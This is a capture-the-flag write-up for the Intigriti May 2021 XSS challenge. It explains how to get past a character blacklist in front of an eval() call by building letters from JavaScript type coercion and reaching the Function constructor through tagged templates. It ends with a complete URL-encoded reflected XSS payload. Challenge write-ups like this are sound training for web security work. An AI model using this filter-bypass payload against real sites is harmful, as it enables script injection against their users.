---
grand_parent: Write-ups
parent: 2021
title: May
nav_order: 1
---

## Write-up
Looking at the [source](view-source:https://challenge-0521.intigriti.io/captcha.php) of the challenge, we see that there is a sink within the function `calc()` on lines 99 onward:

```js
function calc() {
        const operation = a.innerText + b.innerText + c.value;
        if (!operation.match(/[a-df-z<>()!\\='"]/gi)) { // Allow letter 'e' because: https://en.wikipedia.org/wiki/E_(mathematical_constant)
            if (d.innerText == eval(operation)) {
```

Where the variable `c` contains the value within the only input box on the page.

<image src="images/1.jpg" />

Seems like we can directly reach the `eval()` sink by injecting our JS code within the HTML input box. However, there is a regex filter that will reject any input that contains any of the blacklisted characters. It appears that only numbers, the letter "e", and some special characters are permitted.

The goal is to be able to pop an alert box with the domain, so our final payload could be something like:

```js
Function(alert(document.domain))()
```

<image src="images/2.jpg" />

One way to achieve XSS under such constraints would be to use [JSF**k](https://github.com/aemkei/jsfuck). However, it requires the characters `!` and `( )`, which are blacklisted.

<image src="images/3.jpg" />

It would appear that we have to construct our own modified version of JSF**k by making use of the allowed characters (`[ ] + {}` etc) and then obtaining english alphabets by extracting the characters from the output. For example, the following shows the various output based on the input in JavaScript:

| OUTPUT | INPUT |
|--------|-------|
|`"NaN"`| `[]-{}+[]` |
|`"undefined"`|`[][[]]+[]`|
|`"[object Object]"`|`[]+{}`|
|`"Infinity"`| `1e999+[]`<br> ***e** is not blacklisted by the regex*|
|`"[object HTMLProgressElement]"`|`e+[]`<br> *accesses the **"e"** HTML element*|

> Appending `+[]` casts the output to string type.

This is how the input and output looks like:

<image src="images/4.jpg" />

We can then extract the alphabets from these output by the following format:

```js
[INPUT][0][pos]   // where INPUT is the input characters and pos is the charAt character to obtain
```

An example to retrieve the letter "d" (*INPUT = `[][[]]+[]`, pos = `2`*):

<image src="images/5.jpg" />

As a result, we now have access to the following charset:

```
a => [[]-{}+[]][0][1]
b => [[]+{}][0][2]
c => [[]+{}][0][5]
d => [[][[]]+[]][0][2]
e => [[][[]]+[]][0][3]
f => [[][[]]+[]][0][4]
g => [e+[]][0][13]
i => [[][[]]+[]][0][5]
j => [[]+{}][0][3]
l => [e+[]][0][21]
m => [e+[]][0][23]
n => [[][[]]+[]][0][1]
o => [[]+{}][0][1]
r => [e+[]][0][13]
s => [e+[]][0][18]
t => [1e999+[]][0][6]
u => [[][[]]+[]][0][0]
y => [1e999+[]][0][7]
```

We are still missing some characters from our payload goal:

```js
Function(alert(document.domain))()
```

An alternative way, instead of using the word `Function`, we could use the string `[]["find"]["constructor"]` to retrieve the [constructor](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/constructor) of a native function (in this case, *"find"*). Effectively, this means that we are using `Function`. So, our payload becomes:

```js
[]["find"]["constructor"](alert(document.domain))()
```

Backticks (`) are also not filtered, so we replace it in the payload goal. It now looks like

```js
[]["find"]["constructor"]`alert(document.domain)```
```

<image src="images/6.jpg" />

Now, we just need to form the string `alert(document.domain)`. Let us see what is the output of `[]["find"]["constructor"]` (casting to string with `+[]`):

<image src="images/7.jpg" />

Let's confirm that we are able to extract the alphabets while complying with the regex. This means we have to form the words `find` and `constructor` using the charset we have so far:

```
f => [[][[]]+[]][0][4]
i => [[][[]]+[]][0][5]
n => [[][[]]+[]][0][1]
d => [[][[]]+[]][0][2]
...
```

<image src="images/8.jpg" />

We can now expand our available charset using the same method as before to extract alphabets. Updated charset:

```
a => [[]-{}+[]][0][1]
b => [[]+{}][0][2]
c => [[]+{}][0][5]
d => [[][[]]+[]][0][2]
e => [[][[]]+[]][0][3]
f => [[][[]]+[]][0][4]
g => [e+[]][0][13]
i => [[][[]]+[]][0][5]
j => [[]+{}][0][3]
l => [e+[]][0][21]
m => [e+[]][0][23]
n => [[][[]]+[]][0][1]
o => [[]+{}][0][1]
r => [e+[]][0][13]
s => [e+[]][0][18]
t => [1e999+[]][0][6]
u => [[][[]]+[]][0][0]
v => [[][[[][[]]+[]][0][4]+[[][[]]+[]][0][5]+[[][[]]+[]][0][1]+[[][[]]+[]][0][2]]+[]][0][23]
y => [1e999+[]][0][7]
( => [[][[[][[]]+[]][0][4]+[[][[]]+[]][0][5]+[[][[]]+[]][0][1]+[[][[]]+[]][0][2]]+[]][0][13]
) => [[][[[][[]]+[]][0][4]+[[][[]]+[]][0][5]+[[][[]]+[]][0][1]+[[][[]]+[]][0][2]]+[]][0][14]
```

It appears that we can now form the payload: `alert(document.domain)` with our charset.

```js
[[]-{}+[]][0][1] + [e+[]][0][21] + [[][[]]+[]][0][3] + [e+[]][0][13] + [1e999+[]][0][6] + [[][[[][[]]+[]][0][4]+[[][[]]+[]][0][5]+[[][[]]+[]][0][1]+[[][[]]+[]][0][2]]+[]][0][13] + [[][[]]+[]][0][2] + [[]+{}][0][1] + [[]+{}][0][5] + [[][[]]+[]][0][0] + [e+[]][0][23] + [[][[]]+[]][0][3] + [[][[]]+[]][0][1] + [1e999+[]][0][6] + `.` + [[][[]]+[]][0][2] + [[]+{}][0][1] + [e+[]][0][23] + [[]-{}+[]][0][1] + [[][[]]+[]][0][5] + [[][[]]+[]][0][1] + [[][[[][[]]+[]][0][4]+[[][[]]+[]][0][5]+[[][[]]+[]][0][1]+[[][[]]+[]][0][2]]+[]][0][14]
```

<image src="images/9.jpg" />

However, there is a *caveat* that was discovered when attempting to use this payload:

```js
[]["find"]["constructor"]`[[]-{}+[]][0][1] + [e+[]][0][21] + [[][[]]+[]][0][3] + [e+[]][0][13] + [1e999+[]][0][6] + [[][[[][[]]+[]][0][4]+[[][[]]+[]][0][5]+[[][[]]+[]][0][1]+[[][[]]+[]][0][2]]+[]][0][13] + [[][[]]+[]][0][2] + [[]+{}][0][1] + [[]+{}][0][5] + [[][[]]+[]][0][0] + [e+[]][0][23] + [[][[]]+[]][0][3] + [[][[]]+[]][0][1] + [1e999+[]][0][6] + `.` + [[][[]]+[]][0][2] + [[]+{}][0][1] + [e+[]][0][23] + [[]-{}+[]][0][1] + [[][[]]+[]][0][5] + [[][[]]+[]][0][1] + [[][[[][[]]+[]][0][4]+[[][[]]+[]][0][5]+[[][[]]+[]][0][1]+[[][[]]+[]][0][2]]+[]][0][14]`
```

The `alert(document.domain)` remains "encoded" in the same format that we injected it with:

<image src="images/10.jpg" />

To resolve this, we have to wrap the `alert` payload with `${}` in order for it to process it properly (and not as a literal string). Let's see if this works then:

```js
[]["find"]["constructor"]`${[[]-{}+[]][0][1] + [e+[]][0][21] + [[][[]]+[]][0][3] + [e+[]][0][13] + [1e999+[]][0][6] + [[][[[][[]]+[]][0][4]+[[][[]]+[]][0][5]+[[][[]]+[]][0][1]+[[][[]]+[]][0][2]]+[]][0][13] + [[][[]]+[]][0][2] + [[]+{}][0][1] + [[]+{}][0][5] + [[][[]]+[]][0][0] + [e+[]][0][23] + [[][[]]+[]][0][3] + [[][[]]+[]][0][1] + [1e999+[]][0][6] + `.` + [[][[]]+[]][0][2] + [[]+{}][0][1] + [e+[]][0][23] + [[]-{}+[]][0][1] + [[][[]]+[]][0][5] + [[][[]]+[]][0][1] + [[][[[][[]]+[]][0][4]+[[][[]]+[]][0][5]+[[][[]]+[]][0][1]+[[][[]]+[]][0][2]]+[]][0][14]}`
```

... but to no avail:

<image src="images/11.jpg" />

Looking at the [documentation](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals#tagged_templates), it appears that tagged literals are handled in a unique way. It appears to expect a string before and after the `${}` template before passing the contents of `${}` into the function (anonymous function in this case).

So, we will do something like:

```js
[]["find"]["constructor"]`e1${PAYLOAD}e1`
// "e1" is used since we have to comply with the regex still
```

<image src="images/12.jpg" />

All looks well, so we will invoke the function immediately by appending 2 more backticks to the payload:

```js
[]["find"]["constructor"]`e1${PAYLOAD}e1```
```

<image src="images/13.jpg" />

Payload works!

Final step, since the solution cannot be a self-XSS, let's see if reflected works by guessing the parameter to be `c` (since that is the HTML `id` of the input box)

We URL-encode it and the final URL is thus:

```
https://challenge-0521.intigriti.io/captcha.php?c=%5B%5D%5B%5B%5B%5D%5B%5B%5D%5D%2B%5B%5D%5D%5B0%5D%5B4%5D%20%2B%20%5B%5B%5D%5B%5B%5D%5D%2B%5B%5D%5D%5B0%5D%5B5%5D%20%2B%20%5B%5B%5D%5B%5B%5D%5D%2B%5B%5D%5D%5B0%5D%5B1%5D%20%2B%20%5B%5B%5D%5B%5B%5D%5D%2B%5B%5D%5D%5B0%5D%5B2%5D%5D%5B%5B%5B%5D%2B%7B%7D%5D%5B0%5D%5B5%5D%20%2B%20%5B%5B%5D%2B%7B%7D%5D%5B0%5D%5B1%5D%20%2B%20%5B%5B%5D%5B%5B%5D%5D%2B%5B%5D%5D%5B0%5D%5B1%5D%20%2B%20%5Be%2B%5B%5D%5D%5B0%5D%5B18%5D%20%2B%20%5B1e999%2B%5B%5D%5D%5B0%5D%5B6%5D%20%2B%20%5Be%2B%5B%5D%5D%5B0%5D%5B13%5D%20%2B%20%5B%5B%5D%5B%5B%5D%5D%2B%5B%5D%5D%5B0%5D%5B0%5D%20%2B%20%5B%5B%5D%2B%7B%7D%5D%5B0%5D%5B5%5D%20%2B%20%5B1e999%2B%5B%5D%5D%5B0%5D%5B6%5D%20%2B%20%5B%5B%5D%2B%7B%7D%5D%5B0%5D%5B1%5D%20%2B%20%5Be%2B%5B%5D%5D%5B0%5D%5B13%5D%5D%60e1%24%7B%5B%5B%5D%2D%7B%7D%2B%5B%5D%5D%5B0%5D%5B1%5D%20%2B%20%5Be%2B%5B%5D%5D%5B0%5D%5B21%5D%20%2B%20%5B%5B%5D%5B%5B%5D%5D%2B%5B%5D%5D%5B0%5D%5B3%5D%20%2B%20%5Be%2B%5B%5D%5D%5B0%5D%5B13%5D%20%2B%20%5B1e999%2B%5B%5D%5D%5B0%5D%5B6%5D%20%2B%20%5B%5B%5D%5B%5B%5B%5D%5B%5B%5D%5D%2B%5B%5D%5D%5B0%5D%5B4%5D%2B%5B%5B%5D%5B%5B%5D%5D%2B%5B%5D%5D%5B0%5D%5B5%5D%2B%5B%5B%5D%5B%5B%5D%5D%2B%5B%5D%5D%5B0%5D%5B1%5D%2B%5B%5B%5D%5B%5B%5D%5D%2B%5B%5D%5D%5B0%5D%5B2%5D%5D%2B%5B%5D%5D%5B0%5D%5B13%5D%20%2B%20%5B%5B%5D%5B%5B%5D%5D%2B%5B%5D%5D%5B0%5D%5B2%5D%20%2B%20%5B%5B%5D%2B%7B%7D%5D%5B0%5D%5B1%5D%20%2B%20%5B%5B%5D%2B%7B%7D%5D%5B0%5D%5B5%5D%20%2B%20%5B%5B%5D%5B%5B%5D%5D%2B%5B%5D%5D%5B0%5D%5B0%5D%20%2B%20%5Be%2B%5B%5D%5D%5B0%5D%5B23%5D%20%2B%20%5B%5B%5D%5B%5B%5D%5D%2B%5B%5D%5D%5B0%5D%5B3%5D%20%2B%20%5B%5B%5D%5B%5B%5D%5D%2B%5B%5D%5D%5B0%5D%5B1%5D%20%2B%20%5B1e999%2B%5B%5D%5D%5B0%5D%5B6%5D%20%2B%20%60%2E%60%20%2B%20%5B%5B%5D%5B%5B%5D%5D%2B%5B%5D%5D%5B0%5D%5B2%5D%20%2B%20%5B%5B%5D%2B%7B%7D%5D%5B0%5D%5B1%5D%20%2B%20%5Be%2B%5B%5D%5D%5B0%5D%5B23%5D%20%2B%20%5B%5B%5D%2D%7B%7D%2B%5B%5D%5D%5B0%5D%5B1%5D%20%2B%20%5B%5B%5D%5B%5B%5D%5D%2B%5B%5D%5D%5B0%5D%5B5%5D%20%2B%20%5B%5B%5D%5B%5B%5D%5D%2B%5B%5D%5D%5B0%5D%5B1%5D%20%2B%20%5B%5B%5D%5B%5B%5B%5D%5B%5B%5D%5D%2B%5B%5D%5D%5B0%5D%5B4%5D%2B%5B%5B%5D%5B%5B%5D%5D%2B%5B%5D%5D%5B0%5D%5B5%5D%2B%5B%5B%5D%5B%5B%5D%5D%2B%5B%5D%5D%5B0%5D%5B1%5D%2B%5B%5B%5D%5B%5B%5D%5D%2B%5B%5D%5D%5B0%5D%5B2%5D%5D%2B%5B%5D%5D%5B0%5D%5B14%5D%7De1%60%60%60
```

Clicking the "Submit" button, the XSS will be triggered.

<image src="images/proof.jpg" />

